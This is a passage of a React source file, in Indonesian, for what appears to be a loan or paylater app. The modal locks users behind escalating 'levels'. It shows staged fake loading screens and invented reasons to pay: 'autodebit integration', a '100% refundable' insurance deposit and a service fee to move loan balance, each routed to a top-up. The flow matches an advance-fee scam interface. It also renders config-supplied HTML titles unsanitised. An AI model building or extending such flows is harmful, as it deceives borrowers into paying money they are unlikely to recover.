import { useState, useEffect, useRef } from "react";
import toast from "react-hot-toast";
import {
  Banknote,
  Plus,
  ShieldCheck,
  AlertTriangle,
  RotateCcw,
  Wallet,
  Landmark,
  Loader2,
  CheckCircle2,
} from "lucide-react";
import Modal from "@/components/ui/Modal";
import { formatRupiah, digitsOnly } from "@/utils/format";

export default function LevelLockModal({
  state,
  activeLevel = 4,
  user = {},
  levelConfigs = [],
  onClose,
  onTopUp,
  onAction,
}) {
  const [l2Step, setL2Step] = useState("info"); // "info" | "detail"
  const [l3Step, setL3Step] = useState("tertunda"); // "tertunda" | "detail"
  const [pindahStep, setPindahStep] = useState("info"); // "info" | "konfirmasi" | "rincian"
  const [pindahNominal, setPindahNominal] = useState("10000");
  const [loadingStage, setLoadingStage] = useState(null);
  const transitionTimerRef = useRef(null);

  const clearTransition = () => {
    if (transitionTimerRef.current) {
      clearTimeout(transitionTimerRef.current);
      transitionTimerRef.current = null;
    }
    setLoadingStage(null);
  };

  useEffect(() => {
    clearTransition();
    setL2Step("info");

    if (state === "level3_detail") {
      setL3Step("detail");
    } else {
      setL3Step("tertunda");
    }

    if (
      state === "pindah_saldo" ||
      (typeof state === "string" && state.startsWith("level") && Number(state.replace("level", "")) >= 4)
    ) {
      setPindahStep("info");
      setPindahNominal("10000");
    }

    return () => {
      if (transitionTimerRef.current) {
        clearTimeout(transitionTimerRef.current);
        transitionTimerRef.current = null;
      }
    };
  }, [state]);

  const startDelayedTransition = ({ key, title, subtitle }, nextFn) => {
    clearTransition();
    setLoadingStage({ key, title, subtitle });
    transitionTimerRef.current = setTimeout(() => {
      transitionTimerRef.current = null;
      setLoadingStage(null);
      nextFn();
    }, 5000);
  };

  const handleClose = () => {
    clearTransition();
    onClose?.();
  };

  if (!state) return null;

  const configMap = (Array.isArray(levelConfigs) ? levelConfigs : []).reduce((acc, cur) => {
    if (cur && cur.level) acc[cur.level] = cur;
    return acc;
  }, {});

  const c1 = configMap[1] || {};
  const c2 = configMap[2] || {};
  const c3 = configMap[3] || {};

  // Level 4, 5, 6, 7 Pindah Saldo
  const currentLvlNum =
    typeof state === "string" && state.startsWith("level") && Number(state.replace("level", "")) >= 4
      ? Number(state.replace("level", ""))
      : (activeLevel || 4);

  const cPindah = configMap[currentLvlNum] || configMap[4] || {};

  // Parse detail_content untuk Level 3 jika JSON
  let l3Details = [];
  try {
    if (typeof c3.detail_content === "string" && c3.detail_content.trim().startsWith("[")) {
      l3Details = JSON.parse(c3.detail_content);
    }
  } catch {
    l3Details = [];
  }
  if (!Array.isArray(l3Details) || l3Details.length === 0) {
    if (typeof c3.detail_content === "string" && c3.detail_content.trim()) {
      l3Details = [{ header: "Informasi Penting", body: c3.detail_content }];
    } else {
      l3Details = [
        {
          header: "Mengapa perlu Asuransi?",
          body: "Sesuai dengan kebijakan keamanan transaksi tingkat tinggi (Level 3+), pencairan dana memerlukan Deposit Asuransi Sementara. Ini bertujuan untuk memverifikasi bahwa rekening penerima adalah valid dan aktif.",
        },
        {
          header: "Apakah Dana Kembali?",
          body: "YA, 100% KEMBALI. Dana asuransi ini bersifat Refundable. Setelah sistem berhasil memverifikasi transfer masuk, dana asuransi akan otomatis dikembalikan ke saldo akun Anda dalam waktu 10-30 menit bersamaan dengan dana transfer Anda.",
        },
      ];
    }
  }

  // Parse detail_content untuk Pindah Saldo (fee_warning & fee_amount)
  let pindahFeeWarning =
    "Perpindahan Saldo Pinjaman ke Saldo utama membutuhkan Dana Layanan. Dana tersebut harus melalui proses Topup Saldo menggunakan dana pribadi Anda.\n\nDana Layanan ini Akan Tetap Masuk ke Saldo Anda, tidak diambil perusahaan.";
  let pindahFeeAmount = 100000;

  try {
    if (typeof cPindah.detail_content === "string" && cPindah.detail_content.trim().startsWith("{")) {
      const parsed = JSON.parse(cPindah.detail_content);
      if (parsed.fee_warning) pindahFeeWarning = parsed.fee_warning;
      if (parsed.fee_amount) pindahFeeAmount = Number(parsed.fee_amount) || 100000;
    }
  } catch {
    // fallback
  }

  const isPindahSaldoState =
    state === "pindah_saldo" ||
    (typeof state === "string" && state.startsWith("level") && Number(state.replace("level", "")) >= 4);

  return (
    <Modal open={!!state} onClose={handleClose}>
      {loadingStage ? (
        <div className="py-10 px-2 text-center space-y-5">
          <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
            <span className="absolute inset-0 rounded-full bg-primary-100 animate-ping opacity-40" />
            <span className="relative grid h-20 w-20 place-items-center rounded-full bg-primary-50 text-primary-700 ring-4 ring-primary-100 shadow-inner">
              <Loader2 className="h-10 w-10 animate-spin" />
            </span>
          </div>

          <div className="space-y-1.5">
            <h3 className="text-lg sm:text-xl font-black text-slate-900">
              {loadingStage.title}
            </h3>
            <p className="mx-auto max-w-xs text-xs sm:text-sm font-semibold text-slate-500 leading-relaxed">
              {loadingStage.subtitle}
            </p>
          </div>

          <div className="mx-auto max-w-xs space-y-2">
            <div className="h-2.5 w-full overflow-hidden rounded-full bg-slate-100 p-0.5">
              <div
                key={loadingStage.key}
                className="animate-progress-5s h-full rounded-full bg-gradient-to-r from-primary-600 via-primary-500 to-[#00D1B2]"
              />
            </div>
            <p className="text-[11px] font-bold text-slate-400">
              Mohon tunggu sebentar (± 5 detik)...
            </p>
          </div>
        </div>
      ) : (
        <>
          {state === "level1" && (
            /* GAMBAR 1: Fitur Terkunci (Level 1) */
            <div className="text-center py-2">
              {/* Ilustrasi Gembok Emas 3D */}
              <div className="mx-auto my-4 flex h-32 w-32 items-center justify-center">
                <svg viewBox="0 0 160 160" className="h-full w-full drop-shadow-lg" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path
                    d="M50 78V50C50 33.43 63.43 20 80 20C96.57 20 110 33.43 110 50V78"
                    stroke="url(#shackleGrad)"
                    strokeWidth="16"
                    strokeLinecap="round"
                  />
                  <rect x="36" y="68" width="88" height="72" rx="18" fill="url(#lockBodyGrad)" />
                  <rect x="42" y="74" width="76" height="12" rx="6" fill="#FDE047" opacity="0.6" />
                  <circle cx="80" cy="100" r="8" fill="#713F12" />
                  <path d="M76 102L74 118H86L84 102Z" fill="#713F12" />
                  <defs>
                    <linearGradient id="shackleGrad" x1="50" y1="20" x2="110" y2="78" gradientUnits="userSpaceOnUse">
                      <stop stopColor="#94A3B8" />
                      <stop offset="0.5" stopColor="#E2E8F0" />
                      <stop offset="1" stopColor="#64748B" />
                    </linearGradient>
                    <linearGradient id="lockBodyGrad" x1="36" y1="68" x2="124" y2="140" gradientUnits="userSpaceOnUse">
                      <stop stopColor="#FACC15" />
                      <stop offset="1" stopColor="#EAB308" />
                    </linearGradient>
                  </defs>
                </svg>
              </div>

              <h3 className="text-2xl font-black text-slate-900">
                {c1.title || "Fitur Terkunci"}
              </h3>
              <p className="mx-auto mt-2 max-w-xs text-sm font-semibold text-slate-500 leading-relaxed">
                {c1.message || (
                  <>
                    Maaf, Anda masih berada di <b className="text-slate-800">Level 1</b>. Silakan Top Up saldo untuk membuka fitur ini.
                  </>
                )}
              </p>

              <button
                type="button"
                onClick={() => {
                  handleClose();
                  onTopUp();
                }}
                className="mt-6 flex w-full items-center justify-center gap-2 rounded-2xl bg-primary-700 py-4 text-base font-black text-white shadow-lg shadow-primary-700/30 transition hover:bg-primary-800 active:scale-[0.98]"
              >
                <Plus className="h-5 w-5" />
                {c1.button_text || "Top Up Sekarang"}
              </button>

              <button
                type="button"
                onClick={handleClose}
                className="mt-3 block w-full py-2 text-center text-sm font-extrabold text-slate-400 hover:text-slate-600"
              >
                {c1.secondary_button_text || "Kembali"}
              </button>
            </div>
          )}

          {state === "level2_transfer" && l2Step === "info" && (
            /* Tahap 1 Level 2: Rekening Belum Terintegrasi Autodebet */
            <div className="text-center py-2">
              {/* Ilustrasi 3 Kartu Identitas Profil */}
              <div className="mx-auto my-3 flex justify-center">
                <svg viewBox="0 0 280 180" className="h-36 w-60 drop-shadow-md" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <g transform="rotate(-6 80 100)">
                    <rect x="30" y="40" width="75" height="120" rx="14" fill="#38BDF8" />
                    <rect x="38" y="48" width="59" height="104" rx="10" fill="#FFFFFF" />
                    <circle cx="67" cy="74" r="18" fill="#38BDF8" opacity="0.3" />
                    <circle cx="67" cy="74" r="14" fill="#0284C7" />
                    <rect x="58" y="70" width="18" height="6" rx="2" fill="#1E293B" />
                    <rect x="46" y="98" width="43" height="6" rx="3" fill="#E2E8F0" />
                    <rect x="46" y="110" width="35" height="5" rx="2.5" fill="#CBD5E1" />
                  </g>

                  <g transform="rotate(6 200 100)">
                    <rect x="175" y="40" width="75" height="120" rx="14" fill="#FACC15" />
                    <rect x="183" y="48" width="59" height="104" rx="10" fill="#FFFFFF" />
                    <circle cx="212" cy="74" r="18" fill="#FACC15" opacity="0.3" />
                    <circle cx="212" cy="74" r="14" fill="#CA8A04" />
                    <circle cx="212" cy="73" r="10" fill="#FEF08A" />
                    <rect x="191" y="98" width="43" height="6" rx="3" fill="#E2E8F0" />
                    <rect x="191" y="110" width="35" height="5" rx="2.5" fill="#CBD5E1" />
                  </g>

                  <rect x="95" y="24" width="90" height="136" rx="16" fill="#F43F5E" />
                  <rect x="103" y="32" width="74" height="120" rx="12" fill="#FFFFFF" />
                  <circle cx="140" cy="62" r="22" fill="#F43F5E" opacity="0.2" />
                  <circle cx="140" cy="62" r="18" fill="#FB7185" />
                  <circle cx="140" cy="60" r="13" fill="#FFE4E6" />
                  <rect x="115" y="92" width="50" height="8" rx="4" fill="#F43F5E" />
                  <rect x="115" y="106" width="50" height="6" rx="3" fill="#E2E8F0" />
                  <rect x="115" y="118" width="40" height="6" rx="3" fill="#CBD5E1" />
                </svg>
              </div>

              <h3 className="text-xl sm:text-2xl font-black text-slate-900 leading-tight">
                {c2.title || "Rekening Belum Terintegrasi Autodebet"}
              </h3>

              <div className="mt-4 rounded-3xl border border-slate-100 bg-slate-50/80 p-5 text-center space-y-4">
                <div className="mx-auto flex h-10 w-10 items-center justify-center rounded-full bg-primary-100/70 text-primary-700">
                  <svg className="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                  </svg>
                </div>

                <p className="text-xs sm:text-sm font-semibold text-slate-600 leading-relaxed">
                  {c2.message || "Autodebet adalah sistem pembayaran otomatis yang memungkinkan saldo Anda terpotong langsung untuk membayar tagihan tepat waktu."}
                </p>

                <div className="flex items-center gap-2.5 rounded-2xl border border-slate-200/80 bg-white p-3.5 text-left text-xs font-bold text-slate-700 shadow-sm">
                  <ShieldCheck className="h-5 w-5 shrink-0 text-primary-700" />
                  <span>{c2.note || "Fitur ini wajib diaktifkan demi keamanan dan kelancaran transaksi Anda."}</span>
                </div>
              </div>

              <button
                type="button"
                onClick={() =>
                  startDelayedTransition(
                    {
                      key: `l2_${Date.now()}`,
                      title: "Menghubungkan Integrasi Autodebet...",
                      subtitle: "Sistem sedang menyiapkan verifikasi integrasi autodebet rekening Anda.",
                    },
                    () => setL2Step("detail")
                  )
                }
                className="mt-6 w-full rounded-2xl bg-primary-700 py-4 text-base font-black text-white shadow-lg shadow-primary-700/30 transition hover:bg-primary-800 active:scale-[0.98]"
              >
                {c2.button_text || "Lanjutkan Integrasi"}
              </button>

              <button
                type="button"
                onClick={handleClose}
                className="mt-3 block w-full py-2 text-center text-sm font-extrabold text-slate-400 hover:text-slate-600"
              >
                {c2.secondary_button_text || "Kembali"}
              </button>
            </div>
          )}

          {state === "level2_transfer" && l2Step === "detail" && (
            /* Tahap 2 Level 2: Verifikasi / Aktivasi Integrasi Autodebet */
            <div className="text-center py-2 space-y-4">
              <div className="mx-auto grid h-20 w-20 place-items-center rounded-3xl bg-gradient-to-br from-emerald-50 to-teal-100 text-teal-600 ring-1 ring-teal-200 shadow-sm">
                <CheckCircle2 className="h-10 w-10" />
              </div>

              <div>
                <span className="inline-block rounded-full bg-teal-50 px-3 py-1 text-[11px] font-black uppercase tracking-wider text-teal-700 ring-1 ring-teal-200">
                  Tahap Integrasi Autodebet
                </span>
                <h3 className="mt-2 text-xl sm:text-2xl font-black text-slate-900 leading-tight">
                  {c2.detail_title || "Ketentuan Integrasi Autodebet"}
                </h3>
              </div>

              <div className="rounded-3xl border border-slate-100 bg-slate-50/90 p-5 text-left space-y-3">
                <div className="flex items-start gap-2.5 text-xs sm:text-sm font-semibold text-slate-700 leading-relaxed">
                  <ShieldCheck className="h-5 w-5 shrink-0 text-primary-700 mt-0.5" />
                  <p className="whitespace-pre-line">
                    {c2.detail_content ||
                      "Sistem autodebet memerlukan verifikasi saldo aktif agar rekening tujuan dan sistem pembayaran otomatis dapat tersinkronisasi penuh dengan akun Anda."}
                  </p>
                </div>

                <div className="rounded-2xl border border-amber-200/70 bg-amber-50/80 p-3.5 text-xs font-bold text-amber-900 leading-relaxed">
                  Silakan lakukan Top Up saldo atau verifikasi aktivasi Autodebet agar fitur transfer ke rekening dapat langsung digunakan.
                </div>
              </div>

              <div className="space-y-2.5 pt-2">
                <button
                  type="button"
                  onClick={() => {
                    handleClose();
                    if (onTopUp) {
                      onTopUp();
                    } else {
                      onAction?.("integrasi");
                    }
                  }}
                  className="flex w-full items-center justify-center gap-2 rounded-2xl bg-[#00D1B2] py-4 text-base font-black text-white shadow-lg shadow-[#00D1B2]/30 transition hover:bg-[#00c4a7] active:scale-[0.98]"
                >
                  <Plus className="h-5 w-5" />
                  <span>Top Up Integrasi Autodebet</span>
                </button>

                <button
                  type="button"
                  onClick={() => setL2Step("info")}
                  className="block w-full py-2 text-center text-sm font-extrabold text-slate-400 hover:text-slate-600"
                >
                  Kembali
                </button>
              </div>
            </div>
          )}

      {state === "level2_ppob" && (
        /* GAMBAR 5: Gagal Proses (Transaksi Pulsa di Level 2 / Mode Paylater) */
        <div className="text-center py-2">
          {/* Ilustrasi Silang Merah Besar 3D */}
          <div className="mx-auto my-3 flex justify-center">
            <svg viewBox="0 0 160 160" className="h-32 w-32 drop-shadow-xl" fill="none" xmlns="http://www.w3.org/2000/svg">
              <defs>
                <linearGradient id="crossGrad" x1="20" y1="20" x2="140" y2="140" gradientUnits="userSpaceOnUse">
                  <stop stopColor="#EF4444" />
                  <stop offset="1" stopColor="#DC2626" />
                </linearGradient>
              </defs>
              <rect x="22" y="70" width="116" height="26" rx="13" transform="rotate(45 80 80)" fill="#B91C1C" />
              <rect x="22" y="70" width="116" height="26" rx="13" transform="rotate(-45 80 80)" fill="#B91C1C" />
              <rect x="20" y="67" width="120" height="26" rx="13" transform="rotate(45 80 80)" fill="url(#crossGrad)" />
              <rect x="20" y="67" width="120" height="26" rx="13" transform="rotate(-45 80 80)" fill="url(#crossGrad)" />
              <circle cx="45" cy="45" r="5" fill="#FFFFFF" opacity="0.6" />
            </svg>
          </div>

          <h3 className="text-2xl font-black text-slate-900">Gagal Proses</h3>

          <div className="mt-4 rounded-3xl border border-red-100 bg-red-50/70 p-5 text-center space-y-3">
            <div className="mx-auto flex h-9 w-9 items-center justify-center rounded-full bg-red-100 text-red-500">
              <svg className="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                <circle cx="12" cy="12" r="10" />
                <line x1="4.93" y1="4.93" x2="19.07" y2="19.07" />
              </svg>
            </div>

            <p className="text-xs sm:text-sm font-black text-slate-800 leading-snug">
              Mohon Maaf Saat ini Transaksi gagal.<br />
              Karena Akun Anda dalam <span className="text-red-600">Mode Pinjaman</span>.
            </p>

            <p className="text-xs font-semibold text-slate-500">
              Anda tidak dapat membeli Pulsa, E-Wallet, atau Token Listrik.
            </p>

            <div className="rounded-2xl border border-red-200/80 bg-white/90 p-3 text-xs font-bold leading-relaxed text-red-600 shadow-sm">
              Segera cairkan Saldo Pinjaman Anda Terlebih dahulu untuk membuka fitur ini.
            </div>
          </div>

          <button
            type="button"
            onClick={() => {
              handleClose();
              if (onTopUp) {
                onTopUp();
              } else {
                onAction?.("cairkan");
              }
            }}
            className="mt-6 flex w-full items-center justify-center gap-2 rounded-2xl bg-primary-700 py-4 text-base font-black text-white shadow-lg shadow-primary-700/30 transition hover:bg-primary-800 active:scale-[0.98]"
          >
            <Banknote className="h-5 w-5" />
            Cairkan Pinjaman
          </button>

          <button
            type="button"
            onClick={handleClose}
            className="mt-3 block w-full py-2 text-center text-sm font-extrabold text-slate-400 hover:text-slate-600"
          >
            Kembali ke Beranda
          </button>
        </div>
      )}

      {(state === "level3_tertunda" || state === "level3_asuransi") && l3Step === "tertunda" && (
        /* ATTACHMENT 1: Transfer ke Rekening ANDA TERTUNDA */
        <div className="text-center py-2">
          {/* Ilustrasi Isometric Server Rack & Laptop */}
          <div className="mx-auto my-2 flex justify-center">
            <svg viewBox="0 0 320 200" className="h-44 w-full max-w-[270px] drop-shadow-md" fill="none" xmlns="http://www.w3.org/2000/svg">
              <defs>
                <linearGradient id="srvGrad1" x1="0" y1="0" x2="1" y2="1">
                  <stop offset="0%" stopColor="#BAE6FD" />
                  <stop offset="100%" stopColor="#38BDF8" />
                </linearGradient>
                <linearGradient id="screenGrad" x1="0" y1="0" x2="1" y2="1">
                  <stop offset="0%" stopColor="#0F172A" />
                  <stop offset="100%" stopColor="#1E293B" />
                </linearGradient>
              </defs>
              <g transform="translate(30, 15)">
                <path d="M40 10 L80 30 L40 50 L0 30 Z" fill="#E0F2FE" />
                <path d="M0 30 L40 50 L40 75 L0 55 Z" fill="#7DD3FC" />
                <path d="M80 30 L40 50 L40 75 L80 55 Z" fill="#0284C7" />
                <path d="M0 58 L40 78 L40 103 L0 83 Z" fill="#38BDF8" />
                <path d="M80 58 L40 78 L40 103 L80 83 Z" fill="#0369A1" />
                <path d="M0 86 L40 106 L40 131 L0 111 Z" fill="#0284C7" />
                <path d="M80 86 L40 106 L40 131 L80 111 Z" fill="#075985" />
                <g transform="translate(18, 52)">
                  <path d="M0 10 L30 25 L45 18 L15 3 Z" fill="#F43F5E" />
                  <rect x="18" y="10" width="8" height="3" rx="1" fill="#FEF08A" />
                  <rect x="28" y="15" width="8" height="3" rx="1" fill="#38BDF8" />
                </g>
                <g transform="translate(-8, 122)">
                  <circle cx="18" cy="18" r="10" fill="#FACC15" />
                  <path d="M18 18 L18 8 A10 10 0 0 1 28 18 Z" fill="#10B981" />
                  <rect x="36" y="14" width="5" height="14" rx="2" fill="#F43F5E" />
                  <rect x="44" y="8" width="5" height="20" rx="2" fill="#10B981" />
                  <rect x="52" y="2" width="5" height="26" rx="2" fill="#0EA5E9" />
                </g>
              </g>
              <g transform="translate(135, 45)">
                <path d="M45 80 L115 115 L50 145 L-20 110 Z" fill="#CBD5E1" />
                <path d="M-20 110 L50 145 L50 152 L-20 117 Z" fill="#94A3B8" />
                <path d="M115 115 L50 145 L50 152 L115 122 Z" fill="#64748B" />
                <path d="M-5 100 L45 25 L115 60 L65 135 Z" fill="#0F172A" />
                <path d="M0 98 L47 28 L110 60 L63 130 Z" fill="#1E293B" />
                <path d="M10 90 Q35 55 60 75 T100 45" stroke="#38BDF8" strokeWidth="4" strokeLinecap="round" fill="none" />
                <path d="M10 82 Q35 70 65 60 T100 65" stroke="#F43F5E" strokeWidth="3" strokeLinecap="round" fill="none" />
                <path d="M10 95 Q40 85 70 70 T100 55" stroke="#FACC15" strokeWidth="2.5" strokeLinecap="round" fill="none" />
              </g>
            </svg>
          </div>

          <h3 className="text-xl sm:text-2xl font-black text-slate-900 leading-tight">
            {c3.title || "Transfer ke Rekening"}
          </h3>
          <p className="text-xl sm:text-2xl font-black text-amber-500 tracking-wide mt-0.5">
            {c3.subtitle || "ANDA TERTUNDA"}
          </p>

          <div className="mt-4 rounded-3xl border border-amber-200/70 bg-[#FFFBEB] p-5 text-center space-y-3 shadow-sm">
            <div className="mx-auto flex h-10 w-10 items-center justify-center rounded-full bg-amber-100 text-amber-600">
              <AlertTriangle className="h-5 w-5" />
            </div>

            <p className="text-xs sm:text-sm font-semibold text-slate-700 leading-relaxed">
              {c3.message || "Sistem keamanan kami menahan transaksi ini karena memerlukan Verifikasi Asuransi pada akun Anda. Mohon selesaikan administrasi asuransi agar dana dapat dicairkan ke rekening tujuan dengan aman."}
            </p>
          </div>

          <button
            type="button"
            onClick={() =>
              startDelayedTransition(
                {
                  key: `l3_${Date.now()}`,
                  title: "Memuat Detail Asuransi...",
                  subtitle: "Sistem sedang menyiapkan keterangan lengkap administrasi asuransi dana Anda.",
                },
                () => setL3Step("detail")
              )
            }
            className="mt-6 w-full rounded-2xl bg-primary-700 py-4 text-base font-black text-white shadow-lg shadow-primary-700/30 transition hover:bg-primary-800 active:scale-[0.98]"
          >
            {c3.button_text || "Cek Detail Keterangan"}
          </button>

          <button
            type="button"
            onClick={handleClose}
            className="mt-3 block w-full py-2 text-center text-sm font-extrabold text-slate-400 hover:text-slate-600"
          >
            {c3.secondary_button_text || "Kembali"}
          </button>
        </div>
      )}

      {(state === "level3_detail" || ((state === "level3_tertunda" || state === "level3_asuransi") && l3Step === "detail")) && (
        /* ATTACHMENT 2: Ketentuan Asuransi Dana */
        <div className="text-center py-2">
          {/* Ilustrasi Smartphone & Users */}
          <div className="mx-auto my-2 flex justify-center">
            <svg viewBox="0 0 320 200" className="h-44 w-full max-w-[270px] drop-shadow-md" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M100 130 C70 90 85 50 120 40 C140 70 125 110 100 130 Z" fill="#FDBA74" opacity="0.6" />
              <path d="M220 130 C250 90 235 50 200 40 C180 70 195 110 220 130 Z" fill="#C4B5FD" opacity="0.6" />

              <g transform="translate(115, 12)">
                <rect x="0" y="0" width="90" height="152" rx="18" fill="#4F46E5" />
                <rect x="4" y="4" width="82" height="144" rx="14" fill="#FFFFFF" />
                <rect x="30" y="8" width="30" height="4" rx="2" fill="#E2E8F0" />
                <circle cx="45" cy="42" r="20" fill="#34D399" />
                <circle cx="45" cy="36" r="8" fill="#FFFFFF" />
                <path d="M33 52 C33 46 39 42 45 42 C51 42 57 46 57 52 Z" fill="#FFFFFF" />
                <rect x="12" y="72" width="66" height="11" rx="5.5" fill="#F1F5F9" />
                <rect x="12" y="88" width="66" height="11" rx="5.5" fill="#F1F5F9" />
                <rect x="12" y="104" width="66" height="13" rx="6.5" fill="#6366F1" />
              </g>

              <g transform="translate(50, 48)">
                <circle cx="30" cy="20" r="9" fill="#1E293B" />
                <circle cx="30" cy="22" r="7" fill="#FCD34D" />
                <path d="M20 32 C20 28 40 28 40 32 L43 65 L17 65 Z" fill="#7C3AED" />
                <rect x="21" y="65" width="6" height="32" rx="3" fill="#1E293B" />
                <rect x="33" y="65" width="6" height="32" rx="3" fill="#1E293B" />
                <rect x="28" y="42" width="15" height="20" rx="3" fill="#F97316" transform="rotate(-15 28 42)" />
              </g>

              <g transform="translate(180, 85)">
                <circle cx="42" cy="16" r="9" fill="#1E293B" />
                <circle cx="42" cy="17" r="7" fill="#FDE047" />
                <path d="M28 26 C28 23 56 23 56 26 L59 54 L25 54 Z" fill="#6366F1" />
                <path d="M20 52 C20 48 38 50 45 52 L64 54 C68 60 62 67 52 67 L30 67 C22 67 18 60 20 52 Z" fill="#1E293B" />
                <rect x="38" y="38" width="20" height="15" rx="2" fill="#475569" transform="rotate(-10 38 38)" />
              </g>
            </svg>
          </div>

          <h3 className="text-xl sm:text-2xl font-black text-slate-900 leading-tight">
            {c3.detail_title || "Ketentuan Asuransi Dana"}
          </h3>

          <div className="mt-4 rounded-3xl border border-slate-100 bg-[#F8FAFC] p-5 text-left space-y-4 shadow-sm">
            {l3Details.map((sec, idx) => (
              <div key={idx} className="space-y-1.5">
                <div className="flex items-center gap-2 text-primary-700 font-black text-sm">
                  {idx === 0 ? (
                    <ShieldCheck className="h-5 w-5 shrink-0" />
                  ) : (
                    <RotateCcw className="h-5 w-5 shrink-0" />
                  )}
                  <span>{sec.header}</span>
                </div>
                <p className="text-xs sm:text-sm font-semibold text-slate-600 leading-relaxed pl-7">
                  {sec.body}
                </p>
              </div>
            ))}
          </div>

          <button
            type="button"
            onClick={() => {
              handleClose();
              onTopUp();
            }}
            className="mt-6 flex w-full items-center justify-center gap-2 rounded-2xl bg-[#00D1B2] py-4 text-base font-black text-white shadow-lg shadow-[#00D1B2]/30 transition hover:bg-[#00c4a7] active:scale-[0.98]"
          >
            <Plus className="h-5 w-5" />
            <span>Top Up Asuransi</span>
          </button>

          <button
            type="button"
            onClick={handleClose}
            className="mt-3 block w-full py-2 text-center text-sm font-extrabold text-slate-400 hover:text-slate-600"
          >
            {c3.secondary_button_text || "Batalkan Transaksi"}
          </button>
        </div>
      )}

      {/* ── FLOW PINDAH SALDO (LEVEL 4, 5, 6, 7) ── */}
      {isPindahSaldoState && pindahStep === "info" && (
        /* GAMBAR 1: Transfer Saldo - PayLater Sedang Proses */
        <div className="text-center py-2">
          {/* Ilustrasi Toko Online, Paket & Wanita Membawa Kardus */}
          <div className="mx-auto my-2 flex justify-center">
            <svg viewBox="0 0 340 220" className="h-44 w-full max-w-[280px] drop-shadow-md" fill="none" xmlns="http://www.w3.org/2000/svg">
              <ellipse cx="170" cy="115" rx="100" ry="80" fill="#E0F2FE" opacity="0.6" />

              <g transform="translate(90, 35)">
                <rect x="0" y="0" width="160" height="110" rx="12" fill="#FFFFFF" stroke="#60A5FA" strokeWidth="2.5" />
                <path d="M0 12 C0 5.37 5.37 0 12 0 L148 0 C154.63 0 160 5.37 160 12 L160 22 L0 22 Z" fill="#BFDBFE" opacity="0.4" />
                <rect x="12" y="32" width="60" height="68" rx="6" fill="#F8FAFC" stroke="#E2E8F0" />
                <rect x="22" y="44" width="38" height="28" rx="3" fill="#D97706" opacity="0.8" />
                <path d="M22 56 L60 56 M41 44 L41 72" stroke="#B45309" strokeWidth="2" />
                <rect x="80" y="32" width="68" height="68" rx="6" fill="#F8FAFC" stroke="#E2E8F0" />
                <rect x="88" y="38" width="16" height="4" rx="2" fill="#CBD5E1" />
                <rect x="88" y="46" width="30" height="3" rx="1.5" fill="#E2E8F0" />
                <path d="M148 20 L162 34 L154 42 L140 28 Z" fill="#34D399" />
                <circle cx="145" cy="25" r="2" fill="#FFFFFF" />
              </g>

              <g transform="translate(100, 140)">
                <path d="M12 25 L16 38 L26 38 L30 25 Z" fill="#94A3B8" />
                <path d="M21 25 C14 18 12 8 21 0 C28 8 28 18 21 25 Z" fill="#10B981" />
                <path d="M16 25 C9 20 8 12 16 6 C21 12 21 20 16 25 Z" fill="#34D399" />
                <path d="M26 25 C33 20 34 12 26 6 C21 12 21 20 26 25 Z" fill="#059669" />
              </g>

              <g transform="translate(118, 55)">
                <circle cx="36" cy="16" r="10" fill="#0F172A" />
                <circle cx="38" cy="18" r="6" fill="#FDE047" />
                <path d="M26 28 C26 24 44 24 46 28 L48 52 L24 52 Z" fill="#0D9488" />
                <path d="M22 52 L50 52 L54 75 L18 75 Z" fill="#1E293B" />
                <rect x="23" y="75" width="6" height="42" rx="3" fill="#FDE047" />
                <rect x="39" y="75" width="6" height="42" rx="3" fill="#FDE047" />
                <path d="M20 114 L30 114 L31 118 L19 118 Z" fill="#1E293B" />
                <path d="M37 114 L47 114 L48 118 L36 118 Z" fill="#1E293B" />
                <g transform="translate(42, 28)">
                  <rect x="0" y="0" width="30" height="26" rx="3" fill="#D97706" />
                  <path d="M0 12 L30 12 M15 0 L15 26" stroke="#B45309" strokeWidth="2" />
                </g>
                <path d="M38 32 L48 38 L42 45" stroke="#FDE047" strokeWidth="4" strokeLinecap="round" fill="none" />
              </g>

              <g transform="translate(205, 125)">
                <rect x="0" y="16" width="56" height="42" rx="4" fill="#0F172A" />
                <rect x="20" y="32" width="16" height="26" rx="2" fill="#E2E8F0" />
                <circle cx="32" cy="45" r="1.5" fill="#64748B" />
                <path d="M-4 16 L60 16 L56 6 L0 6 Z" fill="#0D9488" />
                <path d="M6 16 L16 16 L14 6 L4 6 Z" fill="#FFFFFF" />
                <path d="M26 16 L36 16 L34 6 L24 6 Z" fill="#FFFFFF" />
                <path d="M46 16 L56 16 L54 6 L44 6 Z" fill="#FFFFFF" />
                <g transform="translate(20, -14)">
                  <circle cx="8" cy="8" r="7" fill="#EF4444" />
                  <path d="M2 10 L8 20 L14 10 Z" fill="#EF4444" />
                  <circle cx="8" cy="8" r="3" fill="#FFFFFF" />
                </g>
                <rect x="60" y="42" width="16" height="16" rx="2" fill="#D97706" />
                <path d="M60 50 L76 50 M68 42 L68 58" stroke="#B45309" strokeWidth="1.5" />
                <rect x="68" y="28" width="13" height="14" rx="2" fill="#B45309" />
              </g>
            </svg>
          </div>

          {/* Judul Halaman (Support HTML) */}
          {cPindah.title && cPindah.title.includes("<") ? (
            <div
              className="text-xl sm:text-2xl font-black text-slate-900 leading-tight"
              dangerouslySetInnerHTML={{ __html: cPindah.title }}
            />
          ) : (
            <h3 className="text-xl sm:text-2xl font-black text-slate-900 leading-tight">
              {cPindah.title || "Transfer Saldo"}
              <br />
              <span className="text-[#00D1B2]">
                {cPindah.subtitle || "Pinjaman Sedang Proses"}
              </span>
            </h3>
          )}

          {/* Kotak Putih Deskripsi */}
          <div className="mt-4 rounded-3xl border border-slate-100 bg-[#F8FAFC] p-5 text-center space-y-4 shadow-sm">
            <p className="text-xs sm:text-sm font-semibold text-slate-600 leading-relaxed">
              {cPindah.message || "Permintaan pemindahan limit Pinjaman ke Saldo Utama Anda sedang diproses oleh sistem."}
            </p>
            <p className="text-xs sm:text-sm font-semibold text-slate-600 leading-relaxed">
              {cPindah.note || "Silakan lakukan konfirmasi pemindahan saldo untuk melanjutkan transaksi."}
            </p>
          </div>

          {/* Tombol Utama */}
          <button
            type="button"
            onClick={() => setPindahStep("konfirmasi")}
